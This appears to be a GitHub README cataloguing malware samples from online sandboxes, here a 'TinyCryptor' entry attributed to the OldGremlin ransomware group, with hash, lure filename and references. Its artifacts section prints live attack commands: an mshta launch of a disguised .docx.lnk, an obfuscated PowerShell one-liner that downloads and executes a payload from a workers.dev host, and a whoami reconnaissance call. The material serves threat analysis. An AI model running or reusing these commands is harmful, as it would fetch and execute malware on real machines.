# sandb0xed

Interesting malware samples from popular online sandbox services such as [Any.Run](https://app.any.run/), [tria.ge](https://tria.ge/), etc.

## TinyCryptor

MD5: 306978669EAD832F1355468574DF1680
Filename: Рекомендации_МИР.docx.lnk
Reference: [Any.Run](https://app.any.run/tasks/f63e2c95-c558-4d94-b62e-b93a18eca0aa/)
Threat Actor: [OldGremlin](https://www.group-ib.com/blog/oldgremlin)

> "OldGremlin is the only Russian-speaking ransomware operator that violates the unspoken rule about not working within Russia and post-Soviet countries. They carry out multistage targeted attacks on Russian companies and banks using sophisticated tactics and techniques similar to those employed by APT groups. As with similar groups that target foreign entities, OldGremlin can be classed as part of Big Game Hunting, which brings together ransomware operators targeting large corporate networks." - Oleg Skulkin, Senior Digital Forensics Analyst at Group-IB

### Artifacts

![image](https://user-images.githubusercontent.com/61026070/94177556-71cebb00-feb9-11ea-8fba-38de46fc8922.png)

```powershell
 "C:\Windows\System32\cmd.exe" /v /c set m=m^s^h^ta && set a=Р^екоменд^ации_МИР.do^cx.lnk && if exist !cd!\!a! (!m! !cd!\!a!) else (!m! !temp!\Temp1_Рекомендации.zip\!a!)
```

```powershell
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -c while(!(.("""{0}{1}{2}"""-f ("""{1}{0}""" -f 'st-','Te'),("""{2}{1}{0}""" -f 'ec','onn','C'),("""{1}{0}"""-f'n','tio')) ("""{1}{2}{0}""" -f ("""{0}{1}"""-f("""{1}{0}"""-f'.c','le'),'om'),'g','oog') -q)) {&("""{1}{2}{0}{3}""" -f ("""{0}{1}""" -f("""{0}{1}""" -f 'a','rt-'),'Sl'),'S','t','eep') -s 5} .("""{1}{0}""" -f'ex','i')(.("""{2}{1}{0}""" -f't',("""{1}{0}"""-f 'jec','Ob'),("""{0}{1}""" -f'Ne','w-')) ("""{0}{4}{1}{2}{3}"""-f ("""{1}{0}""" -f 'W',("""{0}{1}"""-f 'Net','.')),'C','li','ent','eb')).("""{3}{4}{1}{2}{0}"""-f'ing',("""{1}{0}"""-f'lo','wn'),("""{1}{0}""" -f 'Str','ad'),'D','o')."""In`Vo`kE"""(("""https://schedule.winupdate.workers.dev/load.php"""))
```

```powershell
"C:\Windows\system32\whoami.exe" /groups /fo csv
```